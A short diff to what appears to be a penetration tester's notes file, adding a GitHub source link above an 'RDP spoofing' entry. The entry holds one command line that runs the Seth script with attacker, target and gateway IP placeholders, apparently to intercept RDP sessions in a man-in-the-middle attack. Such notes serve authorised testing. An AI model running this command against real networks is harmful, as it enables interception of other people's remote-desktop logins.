@@ -1,3 +1,6 @@
+# source
+https://github.com/SySS-Research/Seth
+
 # RDP spoofing
 sudo ./seth.sh eth0 <attackerIp> <targetIp> <gatewayIp>
 
